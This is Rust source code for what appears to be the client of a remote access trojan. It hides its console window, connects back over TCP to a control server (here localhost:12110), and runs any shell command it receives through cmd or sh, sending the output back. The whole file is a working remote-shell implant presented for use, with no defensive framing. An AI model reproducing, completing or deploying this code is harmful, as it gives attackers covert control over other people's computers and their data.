#![windows_subsystem = "windows"]
use std::env;
use std::path::{Path, PathBuf};
use std::process::Stdio;

use rat_common::messages::{ClientMessage, ServerMessage};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::process::Command;

struct ShellSession {
    working_dir: PathBuf,
}

impl ShellSession {
    fn new() -> Self {
        Self {
            working_dir: env::current_dir().unwrap_or_else(|_| PathBuf::from(".")),
        }
    }

    async fn execute_command(&mut self, command: &str) -> (String, String, i32) {
        // Check if it's a cd command
        let trimmed = command.trim();
        if trimmed.starts_with("cd ") || trimmed == "cd" {
            return self.handle_cd(trimmed).await;
        }

        // Execute the command in the current working directory
        #[cfg(target_os = "windows")]
        let result = Command::new("cmd")
            .args(["/C", command])
            .current_dir(&self.working_dir)
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .output()
            .await;

        #[cfg(not(target_os = "windows"))]
        let result = Command::new("sh")
            .args(["-c", command])
            .current_dir(&self.working_dir)
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .output()
            .await;

        match result {
            Ok(output) => {
                let stdout = String::from_utf8_lossy(&output.stdout).to_string();
                let stderr = String::from_utf8_lossy(&output.stderr).to_string();
                let exit_code = output.status.code().unwrap_or(-1);
                (stdout, stderr, exit_code)
            }
            Err(e) => (String::new(), e.to_string(), -1),
        }
    }

    async fn handle_cd(&mut self, command: &str) -> (String, String, i32) {
        let path_str = command.strip_prefix("cd").unwrap_or("").trim();

        let target_dir = if path_str.is_empty() {
            // "cd" with no args - go to home directory
            #[cfg(target_os = "windows")]
            {
                env::var("USERPROFILE").unwrap_or_else(|_| ".".to_string())
            }
            #[cfg(not(target_os = "windows"))]
            {
                env::var("HOME").unwrap_or_else(|_| ".".to_string())
            }
        } else {
            path_str.to_string()
        };

        let new_path = if Path::new(&target_dir).is_absolute() {
            PathBuf::from(&target_dir)
        } else {
            self.working_dir.join(&target_dir)
        };

        match new_path.canonicalize() {
            Ok(canonical_path) => {
                if canonical_path.is_dir() {
                    self.working_dir = canonical_path.clone();
                    let stdout = format!("{}\n", canonical_path.display());
                    (stdout, String::new(), 0)
                } else {
                    let stderr = format!("cd: not a directory: {}\n", target_dir);
                    (String::new(), stderr, 1)
                }
            }
            Err(e) => {
                let stderr = format!("cd: {}: {}\n", target_dir, e);
                (String::new(), stderr, 1)
            }
        }
    }
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let mut stream = TcpStream::connect("localhost:12110").await?;
    let mut buffer = vec![0u8; 1024];
    let mut session = ShellSession::new();
    stream.readable().await?;

    loop {
        let n = stream.read(&mut buffer).await?;
        let message = postcard::from_bytes_cobs::<ServerMessage>(&mut buffer[..n])?;
        println!("{message:?}");

        match message {
            ServerMessage::Ping { value } => {
                let response = ClientMessage::Pong { value: value + 1 };
                let bytes = postcard::to_stdvec_cobs(&response)?;
                stream.write_all(&bytes).await?;
            }
            ServerMessage::ExecuteCommand { id, command } => {
                let (stdout, stderr, exit_code) = session.execute_command(&command).await;
                let response = ClientMessage::CommandResult {
                    id,
                    stdout,
                    stderr,
                    exit_code,
                };
                let bytes = postcard::to_stdvec_cobs(&response)?;
                stream.write_all(&bytes).await?;
            }
        }
    }
}
